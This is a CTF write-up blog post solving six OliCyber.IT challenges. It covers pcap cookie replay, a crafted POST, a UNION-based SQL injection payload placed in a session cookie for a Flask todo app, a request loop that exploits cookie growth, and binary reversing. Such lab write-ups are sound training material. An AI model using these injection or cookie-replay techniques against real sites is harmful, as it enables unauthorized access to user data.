---
title: Zbiorczy CTF - OliCyber.IT
author: k1k9
categories: [web, OliCyberIT, misc]
tags: [ctf]
---

<!-- Write table of contents -->
## Table of contents
1. [Easy login](#easy-login)
2. [Pretty please](#pretty-please)
3. [ToDO](#todo)
4. [Monty Hall](#monty-hall)
5. [Section31](#section31)
6. [Ghost](#ghost)

## Easy login
We managed to intercept a user logging into a website, try to find the flag. \
Website: http://easylogin.challs.olicyber.it \
File: capture.pcapng \
Solves: 98 \
Points: 150 
The task revolves around analyzing a pcapng file. The file contains web traffic that comes from logging into a website. The file contains a GET request to a URI ```/flag``` with header:
```http
Cookie: session=d6f816cd031715f733539affe057b5103530c23ff9aa01c5c4e71990ac2ae2ac
```
So all we need to do is read the value of the Cookie header and send it in a GET request to the URI ```/flag```.

## Pretty please
Sometimes you should just ask :) \
Sito: http://prettyplease.challs.olicyber.it
Solves: 148 \
Points: 100

When we enter the page, we are informed that to receive the flag we need to ask for one of the options available in the select box. We also have access to the source code of the web page, after a short analysis we can see that to receive the flag it is enough to send the following POST request:

```http
POST / HTTP/1.1
Host: prettyplease.challs.olicyber.it

how=pretty+please
```

## ToDO
Volevo imparare Python e Flask, niente di meglio di una todo app, a quanto dice Reddit! \
Website: http://todo.challs.olicyber.it \
File: todo-src.zip \
Solves: 31 \
Points: 200

After download and unzip the file, i can see that the application is vulnerable to SQL Injection in the ```get_user_from_session``` function.

This function returns a user based on the value from the session (uuid4). Having the entire application code, we can see which user stores the flag:

```python
def _setup(self):
        cursor = self.get_cursor()
        # ...
        antonio_id = str(uuid.uuid4())
        flag_task_id = str(uuid.uuid4())
        FLAG = os.getenv('FLAG', 'flag{placeholder}')

        cursor.execute("INSERT INTO users (id, username, password_hash) VALUES ('%s', 'antonio', '')" % antonio_id)

        cursor.execute("INSERT INTO tasks (id, description, added_at, completed, user_id) VALUES ('%s', 'Submit the flag: %s', '2021-01-01', 0, '%s')" % (flag_task_id, FLAG, antonio_id))

        self.commit()
        cursor.close()
```

Having the knowledge of which query is responsible for selecting the appropriate user and where the flag is, we can construct the appropriate SQL Injection query:

```http
GET /todo HTTP/1.1
Host: todo.challs.olicyber.it
Cookie: session=k1k9' UNION SELECT id, username FROM users WHERE username='antoniox
```

## Monty Hall
Pokémon Platinum is the best one: Turnback Cave \
Website: http://monty-hall.challs.olicyber.it \
File: monty_hall.zip
Solves: 17 \
Points: 225

On the very beginning I started to analyze the source code of the application. After analyzing the source code, I see that the application saves all our choices in an encrypted AES cookie. I have almost all the necessary information to manipulate cookie, except for the encryption key. \

Breaking 16 bytes of AES in CBC mode is impossible in a reasonable time, so we need to find another way to get the key. \

After a long search, I noticed that with each of our choices, the encrypted cookie is getting longer and longer. Which basically suggests that the solution should be treated as race condition.

Race condition in this case is that the encrypted cookie is saved depending on our choice, not whether we won or lost. \
So when we choose right door, the cookie will be longer than our initial cookie and when we choose wrong door, the cookie will be pretty much the same length as our initial cookie. \

So i wrote a script:
```python
import requests

door = 1
flag = False
cookie = ""
tmpCookie = "1"

while not flag:
    door = door+1 if door < 3 else 1
    cookie = cookie if len(cookie) > len(tmpCookie) else tmpCookie
    resp = requests.post("http://monty-hall.challs.olicyber.it/",
                         headers={"Cookie": f"session={cookie}"},
                         data={"choice": door})
    try: tmpCookie = resp.cookies["session"]
    except: pass
    print(f"[{resp.status_code}] {door} - {cookie}")
    if "flag" in resp.text:
        flag = resp.text.split("<h1>")[1].split("</h1>")[0]
        break
print(f"\n\nFound flag: {flag}")
```
## Section31
To solve this challenge you need to watch the entire Star Trek series. GLHF \
File: section31 \
Solves: 100 \
Points: 75

This task was from the easiest ones. The flag was hidden in binary code of given file: 

![alt text](/assets/posts/olicyberit/Section31.png)

All you need to do is separate flag characters from other chars.

## Ghost
This binary seems scary, it has some ghosts in it. \
File: ghost \
Solves: 42 \
Points: 175

I've started by looking to strings and find something interesting:
```MRktNUU1OSHVbGXVeCV5fS0ZGWzVfWVkMX0Z1Ug5TGQxcCUlXag=``` with looks like base64 encoded string. After decoded it we see only raw bytes.

So I decided to static analyze the binary in Ghidra. After a while I found the functions that are responsible for decoding the flag from base64 and next on raw bytes performing XOR operation and bytes shifting.

![alt text](/assets/posts/olicyberit/ghost.png)

I wrote a python script to decode the flag:
```python
import base64

def fun(data):
    for i in range(0, len(data)):
        data[i] = ((data[i] >> 2) | (data[i] << 6) & 0xFF) ^ 0x2A
    return data

base64String = "MRktNUU1OSHVbGXVeCV5fS0ZGWzVfWVkMX0Z1Ug5TGQxcCUlXag="
decoded = base64.b64decode(base64String)
sample_data = bytearray(decoded)
print(fun(sample_data))
```
But after receiving the flag, I realized that to solve this task all you need to do is run binary with ```gdb``` and dynamically analyze program.